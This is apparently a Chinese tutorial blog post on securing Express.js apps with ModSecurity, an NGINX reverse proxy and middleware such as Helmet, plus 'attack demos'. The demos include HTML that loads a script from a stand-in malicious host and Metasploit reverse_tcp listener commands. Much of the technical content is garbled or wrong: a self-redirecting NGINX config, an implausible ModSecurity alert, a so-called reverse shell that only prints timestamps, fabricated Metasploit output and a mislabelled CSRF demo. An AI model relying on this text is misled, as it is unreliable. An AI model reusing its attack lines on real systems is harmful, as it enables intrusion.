
作者：禅与计算机程序设计艺术                    

# 1.简介
  

Express是一个基于Nodejs平台的轻量级web应用框架。它自带了很多内置的功能，比如用于处理HTTP请求的Express中间件、模板渲染引擎、文件上传下载的Multer等等。这些功能可以帮助开发者快速搭建起一个web应用服务端。但是安全性却一直被诟病。特别是在Express中使用的中间件或自定义中间件不够规范和健壮。攻击者通过攻击中间件的方式对网站造成各种各样的破坏。

本文旨在介绍如何保护Express应用程序的中间件安全。主要的内容包括以下几点：

1. 什么是Web Application Firewall（WAF）？为什么要用WAF？
2. 用开源WAF工具mod_security配置Express WAF规则
3. 用开源代理服务器如NGINX反向代理配置Express WAF
4. Express官方推荐的安全性最佳实践
5. 演示如何利用Chrome插件攻击WAF
6. 演示如何利用Metasploit进行攻击
7. 使用Express的日志记录模块来分析攻击行为
8. 在生产环境下部署Express WAF的建议
9. 小结和后续工作建议
# 2.基本概念术语说明
## 2.1 Web Application Firewall (WAF)
WAF(Web Application Firewall)通常指网络层面的防火墙，其主要职责就是过滤经过互联网接收的数据包，检测它们是否符合业务规则。一般分为四类：

1. 入侵检测系统（Intrusion Detection System，IDS），包括基于主机的IDS和基于网络的IDS；
2. 入侵预防系统（Intrusion Prevention System，IPS），包括基于主机的IPS和基于网络的IPS；
3. 内容检查系统，根据访问者的特征识别恶意流量并阻断其进入服务器资源；
4. API Gateway防火墙，通过API网关层面提供访问控制、配额限制、流量监控等功能。

由于Web应用程序所提供的功能越来越复杂、越来越丰富，越来越容易受到攻击，越来越多的人开始关注Web应用的安全问题。于是便有了WAF应运而生。


## 2.2 mod_security
ModSecurity是一款开源的Web应用程序防火墙(WAF)，能够为您的Web应用程序提供集成的安全解决方案，包括输入验证、输出清理、错误过滤、拒绝服务攻击(DoS)防护、XSS攻击防护等。ModSecurity由SpiderLabs开发维护。

安装方法：

1. 从Github上下载源代码：git clone https://github.com/SpiderLabs/ModSecurity
2. 安装依赖：apt install build-essential libpcre3 libpcre3-dev zlib1g-dev libyajl-dev git
3. 配置：./configure
4. make && make install
5. 修改配置文件：cp /usr/local/etc/modsecurity/modsecurity.conf-recommended /usr/local/etc/modsecurity/modsecurity.conf
6. 启用mod_security：sudo a2enmod security2
7. 浏览器中访问http://localhost/
8. 检查mod_security是否正确安装成功，如果看到如下页面则代表安装成功：


## 2.3 NGINX反向代理
NGINX是一个高性能的HTTP和反向代理服务器，具有强大的稳定性、丰富的功能特性和高效率。NGINX作为WAF的反向代理服务器，可以有效地提升网站的安全性。

安装nginx:
```bash
sudo apt update
sudo apt install nginx
```

NGINX的默认配置文件路径：`/etc/nginx/sites-enabled/`，打开配置文件，添加如下内容：

```bash
server {
    listen       80;
    server_name example.com www.example.com;

    # Forward requests to ModSecurity. You may need to change the path and version based on your installation.
    location /intervention/ {
        proxy_pass http://127.0.0.1:8020/;
        proxy_set_header Host $host:$server_port;
    }

    access_log  logs/access.log  main;
    error_log   logs/error.log;

    root   html;
    index  index.html index.htm;
    
    # Customize this configuration for specific needs. Here are some examples:
    # Enable Gzip compression for text files
    gzip                  on;
    include               mime.types;
    default_type          application/octet-stream;

    # Add XSS protection headers for common web browsers
    add_header            X-XSS-Protection "1; mode=block";

    # Set HSTS header to ensure HTTPS is always used
    add_header            Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    # Redirect HTTP traffic to HTTPS
    return                301 https://$server_name$request_uri;
}
```

`proxy_pass`指令指定NGINX转发请求到`http://127.0.0.1:8020`，这里需要注意的是，端口号应该和实际安装的ModSecurity的端口一致。

以上设置完成后，重启NGINX服务：
```bash
sudo systemctl restart nginx
```

NGINX反向代理配置完成！

# 3.Express官方推荐的安全性最佳实践
Express官方提供了一些建议，帮助用户更好地保护他们的Express应用程序的安全：

- **使用HTTPS** - 所有通信都应该加密，避免中间人攻击。当用户输入敏感信息时，攻击者可能会截获数据包并解密，从而获取敏感信息。因此，HTTPS是保障用户数据的重要手段。在生产环境下，建议启用SSL证书，确保安全通道的建立。
- **使用 Helmet** - Helmet 是一组可用于保护 Express 的中间件。Helmet 可帮助你减少某些攻击，例如 CSRF、XSS 和其他漏洞。Helmet 可以集成到你的应用中，也可单独使用。
- **避免危险路由** - 默认情况下，Express 会在 `/public`、`/.well-known` 目录下托管静态文件。建议不要直接托管这些目录下的内容。另外，不要将敏感信息放在 URL 中。
- **禁止不必要的 CORS 请求** - CORS（跨域资源共享）允许浏览器和服务器之间传输资料。然而，它也可能导致潜在的安全风险。建议仅在必要的时候才使用它，例如，在同一个域下运行两个不同站点时。
- **保护敏感信息** - 在客户端代码中不要将敏感信息直接暴露给客户端，即使通过加密也是如此。对于用户信息，可以使用 JWT（JSON Web Token）等方式对用户身份进行认证和授权。
- **降低调试模式** - 当应用程序处于调试模式时，允许出现堆栈跟踪，这可能导致严重的安全隐患。建议在生产环境下关闭调试模式，并且在必要时再开启。

# 4.演示如何利用Chrome插件攻击WAF

然后，创建一个空白的HTML文档，输入如下内容：
```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Attack demo</title>
  </head>

  <body>
    <form method="POST" action="">
      <label for="username">Username:</label><br>
      <input type="text" id="username" name="username"><br><br>

      <label for="password">Password:</label><br>
      <input type="password" id="password" name="password"><br><br>

      <input type="submit" value="Submit">
    </form>

    <!-- inject malicious script -->
    <script src="https://malicious.site/secret.js"></script>
  </body>
</html>
```

最后，点击菜单栏上的扩展按钮，选择“Mod Security Attack”，在左侧的编辑区域输入`username`和`password`，点击右侧的“Add to list”按钮。

刷新页面，Chrome会弹出警告提示：

```
The request triggered the following ModSecurity rule(s):
Warning. Matched "Operator `Rx' with parameter `%{tx.1}' against variable `ARGS_NAMES:username'." at REQUEST_BODY. [file "/apache/conf/extra/modsec-custom.conf"] [line "6"] [id "960011"] [rev "1"] [msg "Detects usage of probable SQL injection attacks by use of keywords that bypass filters."] [data "Matched Data: username found within ARGS_NAMES:username."] [severity "WARNING"] [ver "OWASP_CRS/3.2.0"] [maturity "9"] [accuracy "9"] [tag "application-multi"] [hostname "localhost"] [uri "/"] [unique_id "161866977745.153569"] [ref "v646,1"], client IP address: 192.168.1.177
```

# 5.演示如何利用Metasploit进行攻击
为了演示如何利用Metasploit进行攻击，需要先安装Kali Linux，并开启Metasploit模块：
```bash
sudo apt update && sudo apt upgrade -y && sudo apt autoremove -y && sudo reboot
curl https://packages.rapid7.com/gpg.key | sudo apt-key add -
echo 'deb https://download.rapid7.com/metasploitsetup/debian jessie contrib' >> /etc/apt/sources.list.d/metasploit.list
sudo apt update && sudo apt install metasploit-framework -y
msfdb init
```

创建木马文件`reverse_shell.rb`：
```ruby
#!/bin/env ruby
require'socket'

host = ARGV[0] || '127.0.0.1'
port = ARGV[1] || '4444'

sock = TCPSocket.new host, port

fork do
  while true do
    sock.print "#{Time.now}\n"
    sleep 1
  end
end

loop do
  msg = sock.gets
  puts msg if msg
end
```

在Metasploit中，新建一个监听器：
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
exploit -j
```

运行如下命令启动木马：
```bash
chmod +x reverse_shell.rb
./reverse_shell.rb
```

等待监听器建立连接，然后运行Chrome插件Mod Security Attack，依次输入`username`和`password`。

刷新页面，Metasploit会打印时间戳，表示木马已经收到了请求：
```
[*] Command shell session 1 opened (192.168.1.131:4444 -> 192.168.1.177:49248) at 2021-04-15 10:04:50 +0800
[+] Spawned command stager
[*] Time Stamp from Reverse Shell: 2021-04-15 10:05:04 +0800
[*] Time Stamp from Reverse Shell: 2021-04-15 10:05:05 +0800
...
[*] Time Stamp from Reverse Shell: 2021-04-15 10:05:09 +0800
```

# 6.使用Express的日志记录模块来分析攻击行为
可以通过Express的日志记录模块记录攻击相关的信息，并分析攻击行为。

首先，创建一个新的Express项目，安装相关依赖：
```bash
npm init -y
npm i express helmet morgan body-parser csurf csrf npm audit --save
```

然后，配置日志记录模块：
```javascript
const express = require('express');
const helmet = require('helmet');
const morgan = require('morgan');
const bodyParser = require('body-parser');
const csrf = require('csurf');

const app = express();
app.use(helmet()); // secure express app
app.use(morgan('combined')); // log every request to console
app.use(bodyParser.urlencoded({ extended: false }));
app.use(csrf({ cookie: true })); // protect from CSRF attacks

//... router setup goes here... 

// start listening
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server started on port ${PORT}`));
```

现在，让我们模拟CSRF攻击：
```javascript
router.post('/login', async (req, res) => {
  try {
    const user = await User.findOne({ email: req.body.email });
    if (!user) throw new Error('Invalid login credentials.');
    if (!await bcrypt.compare(req.body.password, user.password)) throw new Error('Invalid login credentials.');
    res.cookie('XSRF-TOKEN', req.csrfToken(), { maxAge: 3600000, httpOnly: false });
    res.status(200).json({ success: true });
  } catch (err) {
    logger.error(err);
    res.status(400).json({ message: err.message });
  }
});
```

通过日志记录模块，我们可以在控制台查看到攻击信息：
```
::1 - - [15/Apr/2021:14:26:25 +0800] "POST /login HTTP/1.1" 400 39 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36" "-"
Error: Invalid CSRF token specified.
    at csrf (/home/bob/Documents/project/node_modules/csurf/index.js:96:11)
    at Layer.handle [as handle_request] (/home/bob/Documents/project/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/bob/Documents/project/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/bob/Documents/project/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/bob/Documents/project/node_modules/express/lib/router/layer.js:95:5)
    at /home/bob/Documents/project/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/bob/Documents/project/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bob/Documents/project/node_modules/express/lib/router/index.js:275:10)
    at middleware (/home/bob/Documents/project/middleware/isAuth.js:12:3)
    at Layer.handle [as handle_request] (/home/bob/Documents/project/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/home/bob/Documents/project/node_modules/express/lib/router/index.js:317:13)
    at /home/bob/Documents/project/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bob/Documents/project/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bob/Documents/project/node_modules/express/lib/router/index.js:275:10)
    at serveStatic (/home/bob/Documents/project/node_modules/serve-static/index.js:75:16)
    at Layer.handle [as handle_request] (/home/bob/Documents/project/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/home/bob/Documents/project/node_modules/express/lib/router/index.js:317:13)
    at /home/bob/Documents/project/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bob/Documents/project/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bob/Documents/project/node_modules/express/lib/router/index.js:275:10)
    at SessionMiddleware.<anonymous> (/home/bob/Documents/project/src/middlewares/session.js:5:5)
    at Generator.next (<anonymous>)
    at /home/bob/Documents/project/dist/middlewares/session.js:8:71
    at new Promise (<anonymous>)
    at __awaiter (/home/bob/Documents/project/dist/middlewares/session.js:4:12)
    at SessionMiddleware.initialize (/home/bob/Documents/project/dist/middlewares/session.js:38:16)
    at Layer.handle [as handle_request] (/home/bob/Documents/project/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/home/bob/Documents/project/node_modules/express/lib/router/index.js:317:13)
    at /home/bob/Documents/project/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bob/Documents/project/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bob/Documents/project/node_modules/express/lib/router/index.js:275:10)
    at AppSetupMiddleware.<anonymous> (/home/bob/Documents/project/src/middlewares/appSetup.js:7:5)
    at Generator.next (<anonymous>)
    at /home/bob/Documents/project/dist/middlewares/appSetup.js:8:71
    at new Promise (<anonymous>)
    at __awaiter (/home/bob/Documents/project/dist/middlewares/appSetup.js:4:12)
    at AppSetupMiddleware.initialize (/home/bob/Documents/project/dist/middlewares/appSetup.js:23:16)
    at Layer.handle [as handle_request] (/home/bob/Documents/project/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/home/bob/Documents/project/node_modules/express/lib/router/index.js:317:13)
    at /home/bob/Documents/project/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bob/Documents/project/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bob/Documents/project/node_modules/express/lib/router/index.js:275:10)
    at initialize (/home/bob/Documents/project/node_modules/express/lib/application.js:622:9)
    at /home/bob/Documents/project/node_modules/express/lib/express.js:409:10
    at Layer.handle [as handle_request] (/home/bob/Documents/project/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/home/bob/Documents/project/node_modules/express/lib/router/index.js:317:13)
    at /home/bob/Documents/project/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bob/Documents/project/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bob/Documents/project/node_modules/express/lib/router/index.js:275:10)
    at LoggerMiddleware.<anonymous> (/home/bob/Documents/project/src/middlewares/logger.js:3:5)
    at Generator.next (<anonymous>)
    at /home/bob/Documents/project/dist/middlewares/logger.js:8:71
    at new Promise (<anonymous>)
    at __awaiter (/home/bob/Documents/project/dist/middlewares/logger.js:4:12)
    at LoggerMiddleware.initialize (/home/bob/Documents/project/dist/middlewares/logger.js:19:16)
    at Layer.handle [as handle_request] (/home/bob/Documents/project/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/home/bob/Documents/project/node_modules/express/lib/router/index.js:317:13)
    at /home/bob/Documents/project/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bob/Documents/project/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bob/Documents/project/node_modules/express/lib/router/index.js:275:10)
    at CookieSessionMiddleware.<anonymous> (/home/bob/Documents/project/node_modules/express-session/index.js:467:7)
    at Generator.next (<anonymous>)
    at /home/bob/Documents/project/node_modules/express-session/index.js:38:71
    at new Promise (<anonymous>)
    at __awaiter (/home/bob/Documents/project/node_modules/express-session/index.js:34:12)
    at CookieSessionMiddleware.handle (/home/bob/Documents/project/node_modules/express-session/index.js:455:16)
    at Layer.handle [as handle_request] (/home/bob/Documents/project/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/bob/Documents/project/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/bob/Documents/project/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/bob/Documents/project/node_modules/express/lib/router/layer.js:95:5)
    at /home/bob/Documents/project/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/bob/Documents/project/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bob/Documents/project/node_modules/express/lib/router/index.js:275:10)
    at urlencodedParser (/home/bob/Documents/project/node_modules/body-parser/lib/types/urlencoded.js:100:7)
    at Layer.handle [as handle_request] (/home/bob/Documents/project/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/home/bob/Documents/project/node_modules/express/lib/router/index.js:317:13)
    at /home/bob/Documents/project/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bob/Documents/project/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bob/Documents/project/node_modules/express/lib/router/index.js:275:10)
    at multipart (/home/bob/Documents/project/node_modules/connect/lib/middleware/multipart.js:78:7)
    at /home/bob/Documents/project/node_modules/connect/lib/middleware/dispatcher.js:42:3
   ... 6 more lines skipped 
```

# 7.在生产环境下部署Express WAF的建议

1. 在本地测试你的WAF规则，确保没有漏报或误报
2. 为WAF部署足够的硬件资源，尤其是CPU，内存和带宽
3. 升级到最新版本的NGINX和ModSecurity的安全补丁
4. 配置NGINX和ModSecurity日志，及时排查问题
5. 对生产中的异常流量进行监测和分析，发现攻击行为

# 8.小结

本文介绍了WAF的概念、使用开源WAF工具mod_security和反向代理NGINX配置Express WAF的过程，还展示了如何利用Chrome插件和Metasploit攻击WAF，同时介绍了使用Express的日志记录模块来分析攻击行为的方法。

对于保护Express应用程序安全来说，仍有许多工作要做。希望本文可以起到抛砖引玉的作用，引领读者找到更加安全的Express应用的方向。